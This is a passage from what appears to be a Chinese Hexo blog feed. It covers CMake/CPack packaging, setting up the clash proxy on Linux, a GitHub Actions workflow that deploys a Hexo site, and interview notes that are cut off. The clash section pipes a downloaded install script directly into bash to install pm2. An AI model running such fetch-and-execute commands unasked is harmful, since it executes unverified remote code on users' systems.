class="keyword">include</span>(CMakePackageConfigHelpers)</span><br><span class="line"><span class="comment"># generate the config file that is includes the exports</span></span><br><span class="line">configure_package_config_file(<span class="variable">${CMAKE_CURRENT_SOURCE_DIR}</span>/Config.cmake.in</span><br><span class="line">  <span class="string">"${CMAKE_CURRENT_BINARY_DIR}/MathFunctionsConfig.cmake"</span></span><br><span class="line">  INSTALL_DESTINATION <span class="string">"lib/cmake/example"</span></span><br><span class="line">  NO_SET_AND_CHECK_MACRO</span><br><span class="line">  NO_CHECK_REQUIRED_COMPONENTS_MACRO</span><br><span class="line">  )</span><br><span class="line"><span class="comment"># generate the version file for the config file</span></span><br><span class="line">write_basic_package_version_file(</span><br><span class="line">  <span class="string">"${CMAKE_CURRENT_BINARY_DIR}/MathFunctionsConfigVersion.cmake"</span></span><br><span class="line">  VERSION <span class="string">"${Tutorial_VERSION_MAJOR}.${Tutorial_VERSION_MINOR}"</span></span><br><span class="line">  COMPATIBILITY AnyNewerVersion</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># install the configuration file</span></span><br><span class="line"><span class="keyword">install</span>(FILES</span><br><span class="line">  <span class="variable">${CMAKE_CURRENT_BINARY_DIR}</span>/MathFunctionsConfig.cmake</span><br><span class="line">  DESTINATION lib/cmake/MathFunctions</span><br><span class="line">  )</span><br></pre></td></tr></tbody></table></figure><p>此时，我们已经为我们的项目生成了一个可重定位的CMake配置，可以在项目安装或打包后使用。如果我们希望我们的项目也能在构建目录下使用，我们只需要在顶层 <code>CMakeLists.txt</code>的底部添加以下内容:</p><p>通过这个<code>export</code>调用，我们现在可以生成一个<code>Targets.cmake</code>，允许构建目录下配置的<code>MathFunctionsConfig.cmake</code>被其他项目使用，而不需要安装它。</p><h1 id="打包Debug和Release"><a href="#打包Debug和Release" class="headerlink" title="打包Debug和Release"></a>打包Debug和Release</h1><p>注意：这个例子对单配置生成器有效，对多配置生成器（如Visual Studio）无效。</p><p>默认情况下，CMake的模型是一个构建目录只包含一个配置，无论是Debug、Release、MinSizeRel，还是RelWithDebInfo。然而，我们可以设置CPack来捆绑多个构建目录，并构建一个包含同一项目多个配置的包。</p><p>首先，我们要确保Debug版本和Release版本构建的可执行文件和库使用不同的名称。让我们使用d作为Debug版可执行文件和库的后缀。</p><p>在顶层的<code>CMakeLists.txt</code>文件开始处添加：</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span>(CMAKE_DEBUG_POSTFIX d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_library</span>(tutorial_compiler_flags INTERFACE)</span><br></pre></td></tr></tbody></table></figure><p>以及<code>TUtorial</code>可执行文件上的DEBUG_POSTFIX属性:</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add_executable</span>(Tutorial tutorial.cxx)</span><br><span class="line"><span class="keyword">set_target_properties</span>(Tutorial PROPERTIES DEBUG_POSTFIX <span class="variable">${CMAKE_DEBUG_POSTFIX}</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(Tutorial PUBLIC MathFunctions)</span><br></pre></td></tr></tbody></table></figure><p>我们也给<code>MathFunctions</code>库添加版本号。在<code>MathFunctions/CMakeLists.txt</code>中，设置<code>VERSION</code>和<code>SOVERSION</code>属性:</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set_property</span>(<span class="keyword">TARGET</span> MathFunctions PROPERTY VERSION <span class="string">"1.0.0"</span>)</span><br><span class="line"><span class="keyword">set_property</span>(<span class="keyword">TARGET</span> MathFunctions PROPERTY SOVERSION <span class="string">"1"</span>)</span><br></pre></td></tr></tbody></table></figure><p>在项目根目录下：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p step12_build/{debug,release}</span><br></pre></td></tr></tbody></table></figure><p>现在我们需要设置debug和release版本。我们可以使用<code>CMAKE_BUILD_TYPE</code>来设置配置类型：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> debug</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Debug ../..</span><br><span class="line">cmake --build .</span><br><span class="line"><span class="built_in">cd</span> ../release</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Release ../..</span><br><span class="line">cmake --build .</span><br></pre></td></tr></tbody></table></figure><p>现在调试和发行版的构建都已经完成，我们可以使用一个自定义的配置文件将两个构建打包成一个发行版。在step12_build目录下，创建一个名为<code>MultiCPackConfig.cmake</code>的文件。在这个文件中，首先包含cmake可执行文件创建的默认配置文件</p><p>接下来，使用<code>CPACK_INSTALL_CMAKE_PROJECTS</code>变量来指定要安装的项目。在本例中，我们希望同时安装debug和release版本：</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">"release/CPackConfig.cmake"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span>(CPACK_INSTALL_CMAKE_PROJECTS</span><br><span class="line">    <span class="string">"debug;Tutorial;ALL;/"</span></span><br><span class="line">    <span class="string">"release;Tutorial;ALL;/"</span></span><br><span class="line">    )</span><br></pre></td></tr></tbody></table></figure><p>在step12_build目录下，运行<code>cpack</code>，用<code>config</code>选项指定我们的自定义配置文件:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpack --config MultiCPackConfig.cmake</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 构建工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMake </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux使用clash代理</title>
      <link href="2020/08/21/linux-shi-yong-clash-dai-li/"/>
      <url>2020/08/21/linux-shi-yong-clash-dai-li/</url>
      
        <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>偶然发现百度云的学生服务器挺便宜，2核心4g内存机型一个月只要18元，有个随时随地能够访问的Linux环境还是挺好的，遂购入。新系统初始化完成，第一件事当然是来一套<a href="https://github.com/ohmyzsh/ohmyzsh"><code>ohmyzsh</code></a>，结果这就出了问题，<code>git clone</code>太慢了。</p><p><img src="ohmyzsh.png" alt=""></p><p>遂想到是不是该给其使用一下代理。不然之后不止<code>git clone</code>，很多资源都无法下载。</p><a id="more"></a><h1 id="使用clash"><a href="#使用clash" class="headerlink" title="使用clash"></a>使用<code>clash</code></h1><p><a href="https://github.com/Dreamacro/clash"><code>clash</code></a>是一款使用<code>go</code>语言开发的多平台代理工具，支持<code>ss/v2ray</code>等多种协议，在<code>macOS</code>，<code>windows</code>上使用起来很方便，在没有<code>GUI</code>的<code>Linux</code>也只需要稍加配置。</p><p>先从<a href="https://github.com/Dreamacro/clash/releases/download/v1.1.0/clash-linux-amd64-v1.1.0.gz">这里</a>下载<code>clash</code>的<code>linux-amd64</code>可执行文件。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">naruto@bdy:~$ gzip -d clash-linux-amd64-v1.1.0.gz</span><br><span class="line">naruto@bdy:~$ chmod +x clash-linux-amd64-v1.1.0</span><br><span class="line">naruto@bdy:~$ sudo mv clash-linux-amd64-v1.1.0 /usr/<span class="built_in">local</span>/bin/clash</span><br></pre></td></tr></tbody></table></figure><p>然后下载<a href="https://github.com/Dreamacro/maxmind-geoip/releases/download/20200812/Country.mmdb"><code>Country.mmdb</code></a>。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">naruto@bdy:~$ mkdir -p .config/clash</span><br><span class="line">naruto@bdy:~$ mv Country.mmdb .config/clash/</span><br></pre></td></tr></tbody></table></figure><p>之后，需要最关键的<code>clash</code>代理配置文件<code>config.yaml</code>，一般机场都会提供，同样将其放到<code>.config/clash</code>目录下。</p><p>之后先直接启动<code>clash</code>看看效果。</p><p><img src="clash_boot.png" alt=""></p><p>启动遇到<code>WARN[0000] Failed to start Redir UDP Listener: operation not permitted</code>，可以使用<code>sudo clash</code>启动。</p><h1 id="配置GUI界面"><a href="#配置GUI界面" class="headerlink" title="配置GUI界面"></a>配置GUI界面</h1><p>从上一段的图中可以看到，<code>clash</code>服务有一个<code>RESTful API</code>的服务，通过其我们可以访问web管理页面。在<code>config.yaml</code>中制定即可。比较受欢迎的是<a href="https://github.com/haishanh/yacd"><code>yacd</code></a>，可以直接下载<a href="https://github.com/haishanh/yacd/archive/gh-pages.zip">打包好的版本</a>。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">naruto@bdy:~$ unzip yacd-gh-pages.zip</span><br><span class="line">naruto@bdy:~$ mv yacd-gh-pages .config/clash/dashboard</span><br></pre></td></tr></tbody></table></figure><p>在<code>config.yaml</code>中如下设置：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">external-ui:</span> <span class="string">'dashboard'</span></span><br><span class="line"><span class="attr">secret:</span> <span class="string">'test'</span></span><br></pre></td></tr></tbody></table></figure><p>启动<code>clash</code>后，浏览器使用<code>ip:port/ui</code>的方式访问，如下所示。</p><p><img src="yacd.png" alt=""></p><h1 id="享用代理"><a href="#享用代理" class="headerlink" title="享用代理"></a>享用代理</h1><p>在GUI界面选择好代理服务器后，就可以使用代理了。打开另一个终端窗口，执行如下命令，设置<code>http(s)</code>代理环境变量。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890</span><br></pre></td></tr></tbody></table></figure><p><img src="wget.png" alt=""></p><p>接下来，进行一些完善工作。首先每次都手动启动<code>clash</code>并且占用一个终端窗口是很不方便的，先将<code>clash</code>作为一个<code>daemon</code>进程。参照开发者<a href="https://github.com/Dreamacro/clash/wiki/clash-as-a-daemon">推荐</a>，使用<code>pm2</code>。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wget -qO- https://getpm2.com/install.sh | bash</span><br><span class="line">$ pm2 start clash</span><br></pre></td></tr></tbody></table></figure><p>然后是将代理命令作为函数写入<code>.zshrc</code>，注意，下面使用了<code>zsh</code>语法，和<code>bash</code>略有不同。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PROXY_IP=127.0.0.1</span><br><span class="line">PROXY_PORT=7890</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">Proxy</span></span>() {</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">"<span class="variable">$1</span>"</span> = <span class="string">"on"</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">export</span> https_proxy=<span class="variable">$PROXY_IP</span>:<span class="variable">$PROXY_PORT</span></span><br><span class="line">        <span class="built_in">export</span> http_proxy=<span class="variable">$PROXY_IP</span>:<span class="variable">$PROXY_PORT</span></span><br><span class="line">        <span class="built_in">echo</span> Proxy On</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">unset</span> https_proxy</span><br><span class="line">        <span class="built_in">unset</span> http_proxy</span><br><span class="line">        <span class="built_in">echo</span> Proxy Off</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后试试看，非常愉快。</p><p><img src="google.png" alt=""></p><p>最后，我们来装一个<code>rust</code>试试。</p><p><img src="rust.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> clash </tag>
            
            <tag> 代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github Actions简介</title>
      <link href="2020/06/19/github-actions-jian-jie/"/>
      <url>2020/06/19/github-actions-jian-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>GitHub Actions</code>可帮助开发人员在软件开发生命周期内自动化任务。 GitHub Actions是事件驱动的，这意味着可以在发生指定事件后运行一系列命令。例如，每当有人为仓库新建<code>pr</code>时，可以自动运行测试脚本。</p><a id="more"></a><p>该图演示了如何使用GitHub Actions自动运行软件测试脚本。事件自动触发包<code>job</code>含的<code>workflow</code>。然后，<code>job</code>将使用<code>step</code>来控制<code>action</code>的执行顺序。这些<code>action</code>即是自动化测试软件的命令。</p><p><img src="overview-actions-simple.png" alt="Workflow overview"></p><h1 id="Github-Actions的组件"><a href="#Github-Actions的组件" class="headerlink" title="Github Actions的组件"></a>Github Actions的组件</h1><p>以下是可协同运行<code>job</code>的多个<code>GitHub Actions</code>组件的列表。可以看到这些组件之间如何交互</p><p><img src="overview-actions-design.png" alt="Component and service overview"></p><h2 id="workflow"><a href="#workflow" class="headerlink" title="workflow"></a>workflow</h2><p><code>workflow</code>您添加到代码仓库中的自动化过程。其由一个或多个<code>job</code>组成，可以由事件调度或触发。该<code>workflow</code>可用于在GitHub上构建，测试，打包，发布或部署项目。</p><h2 id="Events"><a href="#Events" class="headerlink" title="Events"></a>Events</h2><p><code>event</code>是触发<code>workflow</code>的特定活动。例如，当有人将<code>commit</code> 推送到仓库或创建<code>issue</code>或<code>pr</code>时，Github会产生<code>envent</code>。还可以使用 <a href="https://docs.github.com/en/free-pro-team@latest/rest/reference/repos#create-a-repository-dispatch-event">repository dispatch webhook</a>在发生外部事件时触发<code>workflow</code>。有关可用于触发<code>workflow</code>的<code>evrnt</code>的完整列表，查看<a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/events-that-trigger-workflows">Events that trigger workflows</a>。</p><h2 id="Jobs"><a href="#Jobs" class="headerlink" title="Jobs"></a>Jobs</h2><p><code>job</code>是在同一<code>runner</code>上执行的一组<code>step</code>。默认情况下，具有多个<code>job</code>的<code>workflow</code>程将并行运行这些<code>job</code>。还可以配置<code>workflow</code>以按顺序运行<code>job</code>。例如，一个<code>workflow</code>可以有两个顺序执行的<code>job</code>来构建和测试代码，其中测试<code>job</code>取决于构建<code>job</code>的状态。如果构建<code>job</code>失败，则测试<code>job</code>将不会运行。</p><h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><p><code>step</code>是可以在<code>job</code>中运行命令的单个任务。<code>step</code>可以是操作或<code>shell</code>命令。<code>job</code>中的每个<code>step</code>都在同一<code>runner</code>上执行，从而使该<code>job</code>中的操作可以彼此共享数据。</p><h2 id="Actions"><a href="#Actions" class="headerlink" title="Actions"></a>Actions</h2><p><code>action</code>是独立的命令，组合成<code>step</code>以构建<code>job</code>, <code>action</code>是工作流中最小的可移植构建块。可以创建自己的<code>action</code>，也可以使用GitHub社区创建的<code>action</code>。要在工作流中使用<code>action</code>，必须将其包括在一个<code>step</code>中。</p><h2 id="Runners"><a href="#Runners" class="headerlink" title="Runners"></a>Runners</h2><p><code>runner</code>是已安装<a href="https://github.com/actions/runner">GitHub Actions runner 应用程序</a>的服务器。可以使用GitHub托管的<code>runner</code>，也可以使用自己的<code>runner</code>。<code>runner</code>监听可用的<code>job</code>，一次运行一个<code>job</code>，并将进度，日志和结果反馈给GitHub。对于由GitHub托管的<code>runner</code>，<code>workflow</code>中的每个<code>job</code>都在全新的虚拟环境中运行。</p><p>GitHub托管的<code>runner</code>基于Ubuntu Linux，Microsoft Windows和macOS。有关GitHub托管的<code>runner</code>的信息，请参阅”<a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/virtual-environments-for-github-hosted-runners">Virtual environments for GitHub-hosted runners</a>“。如果需要其他的OS或特定的硬件配置，则可以托管自己的<code>runner</code>。有关自托管<code>runner</code>的信息，请参阅”<a href="https://docs.github.com/en/free-pro-team@latest/actions/hosting-your-own-runners">Hosting your own runners</a>“。</p><h2 id="创建样例workflow"><a href="#创建样例workflow" class="headerlink" title="创建样例workflow"></a>创建样例workflow</h2><p>GitHub Actions使用<code>YAML</code>语法定义<code>event</code>，<code>job</code>和<code>step</code>。这些YAML文件存储在代码存储库中的<code>.github / workflows</code>目录中。</p><p>可以在仓库中创建示例的<code>workflow</code>，该<code>workflow</code>在每次推送代码时自动触发一系列命令。在此<code>workflow</code>中，GitHub Actions 使用了<a href="https://github.com/marketplace?type=actions"><code>actions</code>市场</a>的<code>checkout</code>和<code>setup-node</code> <code>action</code>，然后安装软件依赖项，并运行<code>bat -v</code>。</p><ul><li><p>首先在项目中创建<code>.github/workflow</code>目录</p></li><li><p>在其中，创建一个<code>learn-github-actions.yml</code>文件，内容如下：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">learn-github-actions</span></span><br><span class="line"><span class="attr">on:</span> <span class="string">[push]</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">check-bats-version:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">bats</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">bats</span> <span class="string">-v</span></span><br></pre></td></tr></tbody></table></figure></li><li><p><code>commit</code>这些修改并且<code>push</code>代码到仓库</p></li></ul><p>现在，新的<code>GitHub Actions</code>工作流文件已安装在代码仓库中，并且每次有人将更改推送到仓库时，它将自动运行。有关作业的执行历史记录的详细信息，请参阅”<a href="https://docs.github.com/en/free-pro-team@latest/actions/learn-github-actions/introduction-to-github-actions#viewing-the-jobs-activity">Viewing the workflow’s activity</a>“。</p><p>要更详细了解<code>workflow</code>文件，参阅<a href="https://docs.github.com/en/free-pro-team@latest/actions/learn-github-actions/introduction-to-github-actions#understanding-the-workflow-file">Understanding the workflow file</a>。</p><h1 id="自动构建Hexo博客"><a href="#自动构建Hexo博客" class="headerlink" title="自动构建Hexo博客"></a>自动构建Hexo博客</h1><h2 id="新建-Secret"><a href="#新建-Secret" class="headerlink" title="新建 Secret"></a>新建 Secret</h2><p>在博客项目的的<code>Secrets</code>里面新建一个<code>Secret</code>，名为<code>CI_PRIVATE_KEY</code>，将内容设置为配置在 GitHub 中的公钥对应的私钥，以此在执行<code>action</code>时获取仓库的访问权限。</p><h2 id="配置workflow"><a href="#配置workflow" class="headerlink" title="配置workflow"></a>配置<code>workflow</code></h2><p>在项目根目录下新建<code>.github/workflow/nodejs.yaml</code>，内容为</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">CI</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">hexo</span></span><br><span class="line">  <span class="attr">pull_request:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">hexo</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">deploy:</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">strategy:</span></span><br><span class="line">      <span class="attr">matrix:</span></span><br><span class="line">        <span class="attr">node-version:</span> <span class="string">[12.x]</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Use</span> <span class="string">Node.js</span> <span class="string">${{</span> <span class="string">matrix.node-version</span> <span class="string">}}</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">node-version:</span> <span class="string">${{</span> <span class="string">matrix.node-version</span> <span class="string">}}</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Hexo</span></span><br><span class="line">      <span class="attr">env:</span></span><br><span class="line">        <span class="attr">ACTION_DEPLOY_KEY:</span> <span class="string">${{</span> <span class="string">secrets.CI_PRIVATE_KEY</span> <span class="string">}}</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">mkdir</span> <span class="string">-p</span> <span class="string">~/.ssh/</span></span><br><span class="line">        <span class="string">echo</span> <span class="string">"$ACTION_DEPLOY_KEY"</span> <span class="string">&gt;</span> <span class="string">~/.ssh/id_rsa</span></span><br><span class="line">        <span class="string">chmod</span> <span class="number">600</span> <span class="string">~/.ssh/id_rsa</span></span><br><span class="line">        <span class="string">ssh-keyscan</span> <span class="string">github.com</span> <span class="string">&gt;&gt;</span> <span class="string">~/.ssh/known_hosts</span></span><br><span class="line">        <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.email</span> <span class="string">"wmc314@outlook.com"</span></span><br><span class="line">        <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.name</span> <span class="string">"Jason210314"</span></span><br><span class="line">        <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">hexo-cli</span></span><br><span class="line">        <span class="string">yarn</span> <span class="string">install</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">Deploy</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">hexo</span> <span class="string">c</span></span><br><span class="line">        <span class="string">hexo</span> <span class="string">g</span></span><br><span class="line">        <span class="string">hexo</span> <span class="string">d</span></span><br><span class="line">      <span class="attr">env:</span></span><br><span class="line">        <span class="attr">CI:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CI/CD </tag>
            
            <tag> gitpages </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20年春招字节跳动后端开发实习面试</title>
      <link href="2020/04/18/20-nian-chun-zhao-zi-jie-tiao-dong-hou-duan-kai-fa-shi-xi-mian-shi/"/>
      <url>2020/04/18/20-nian-chun-zhao-zi-jie-tiao-dong-hou-duan-kai-fa-shi-xi-mian-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="第一轮面试"><a href="#第一轮面试" class="headerlink" title="第一轮面试"></a>第一轮面试</h1><p>首先自我介绍</p><h2 id="开发知识"><a href="#开发知识" class="headerlink" title="开发知识"></a>开发知识</h2><p>问我比较熟悉什么语言，答<code>Java</code>，遂开始问<code>Java</code>。</p><ul><li>讲讲<code>HashMap</code>实现原理，<code>HashTable</code>和<code>HashMap</code>有什么不同？</li><li>讲讲<code>ConcurrentHashMap</code>怎么实现的，有什么特点？</li><li><code>Object</code>的<code>wait()</code>和<code>notify()</code>方法有什么作用？</li><li>讲讲<code>Jvm</code>内存结构。</li><li><code>synchronized</code>和<code>Lock</code>在API/使用上有什么不同？</li><li>了解过<code>Redis</code>吗，<code>Redis</code>有哪些常见数据结构？</li><li>剩余的记不清了…</li></ul><a id="more"></a><h2 id="算法题"><a href="#算法题" class="headerlink" title="算法题"></a>算法题</h2><ul><li>如何判断两个单链表是否有交点，单链表是否成环？</li><li><code>n</code>个二极管，超过<code>n/2</code>个二极管是好的。两个二极管可以相互判断对方是好还是坏，好的二极管给的判断一定是准确的，坏的二极管给出的结果是不准确的。找出所有好的二极管。</li><li>写出二叉树的层序遍历。</li></ul><h2 id="反问"><a href="#反问" class="headerlink" title="反问"></a>反问</h2><ul><li><p>请问岗位工作具体是干什么？</p></li><li><p>一般面试学生主要考察基础知识，为啥没有询问OS/计网的知识？</p><p>  答：目前比较需要能尽快上手工作的实习生，所以先考察技术。</p></li></ul><h1 id="第二轮面试"><a href="#第二轮面试" class="headerlink" title="第二轮面试"></a>第二轮面试</h1><p>首先自我介绍</p><p>然后询问一下去年在头条的实习经历，谈了一下简历上的大作业。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul><li><p>讲讲网络的五层模型结构。</p></li><li><p>讲讲三次握手、四次挥手。</p></li><li><p>为什么要<strong>三</strong>次握手，<strong>四</strong>次挥手？</p></li><li><p>讲讲线程和进程的区别？</p></li><li><p>谈谈对协程的理解。</p></li><li><p>线程间什么时候产生死锁？如何进行死锁避免/预防？</p></li><li><p><code>Java</code>有哪些常见容器？</p></li><li><p><code>ConcurrentHashMap</code>在并发访问时相较于<code>HashTable</code>有什么缺点？</p><p>  一时没想起来，面试官提示了<code>size()</code>，然后我讲了下<code>ConcurrentHashMap</code>在并发访问时调用<code>size()</code>的过程及<code>overhead</code>。</p></li></ul><h2 id="算法题-1"><a href="#算法题-1" class="headerlink" title="算法题"></a>算法题</h2><ul><li><p>写一个二叉树左视图</p><p>  刚开始想到层序遍历，然后只记录每层第一个节点，后来面试官提示我简化，写成递归版本。</p></li></ul><h2 id="提问"><a href="#提问" class="headerlink" title="提问"></a>提问</h2><ul><li>主要开发写什么，用什么技术栈？</li></ul><h1 id="HR面试"><a href="#HR面试" class="headerlink" title="HR面试"></a>HR面试</h1><h2 id="HR问"><a href="#HR问" class="headerlink" title="HR问"></a>HR问</h2><ul><li>首先自我介绍</li><li>问有什么爱好？</li><li>实习时间，对未来的职业规划？</li><li>上次实习的经历，遇到什么困难？</li><li>本次实习预计完成什么目标</li><li>对加班的想法，接收度。</li></ul><h2 id="提问-1"><a href="#提问-1" class="headerlink" 